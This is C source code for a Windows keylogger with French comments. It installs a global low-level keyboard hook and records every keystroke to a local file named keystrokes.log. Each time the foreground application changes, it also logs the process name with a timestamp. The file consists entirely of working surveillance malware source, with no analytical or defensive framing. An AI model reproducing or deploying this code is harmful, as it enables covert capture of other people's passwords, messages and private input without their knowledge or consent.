#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

// Variables globales
HHOOK   g_hook;
FILE*   g_logfile;
HWND    g_last_window = NULL;  // Dernière fenêtre enregistrée
char    g_last_process[MAX_PATH] = "";  // Dernier processus enregistré

// Prototypes de fonctions
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static void write_to_log(const char* str);
static void log_new_window(const char* process_name);

// Fonction principale
int main(void)
{
    // Ouvrir le fichier log
    g_logfile = fopen("keystrokes.log", "a");
    if (g_logfile == NULL) {
        MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
        return 1;
    }

    // Installer le hook
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_hook == NULL) {
        MessageBox(NULL, "Erreur lors de l'installation du hook.", "Erreur", MB_ICONERROR);
        fclose(g_logfile);
        return 1;
    }

    // Boucle de message
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyage
    UnhookWindowsHookEx(g_hook);
    fclose(g_logfile);
    return 0;
}

// Fonction de hook pour capturer les frappes
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        // Obtenir la fenêtre et le processus en premier plan
        HWND foregroundWindow = GetForegroundWindow();
        DWORD processId;
        GetWindowThreadProcessId(foregroundWindow, &processId);

        if (foregroundWindow != g_last_window) {
            // La fenêtre a changé, mettre à jour le processus et la fenêtre enregistrés
            g_last_window = foregroundWindow;

            HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (processHandle) {
                char process_name[MAX_PATH] = "<Unknown>";
                GetModuleFileNameEx(processHandle, NULL, process_name, MAX_PATH);
                strcpy(process_name, PathFindFileName(process_name));
                CloseHandle(processHandle);

                // Log the new process and window
                if (strcmp(g_last_process, process_name) != 0) {
                    strcpy(g_last_process, process_name);
                }
                log_new_window(process_name);
            }
        }

        // Conversion de la touche en caractère selon la locale courante
        char key[32] = { 0 };
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        WORD ascii;
        if (ToAscii(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, &ascii, 0) == 1) {
            sprintf(key, "%c", ascii);
        }
        else {
            sprintf(key, "[%lu]", pKeyboard->vkCode);
        }

        // Écrire la touche dans le fichier log
        write_to_log(key);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// Fonction pour enregistrer le changement de fenêtre
static void log_new_window(const char* process_name)
{
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s)\n",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec,
        process_name);
    fflush(g_logfile);
}

// Fonction pour écrire dans le fichier log
static void write_to_log(const char* str)
{
    fprintf(g_logfile, "%s", str);
    fflush(g_logfile);
}
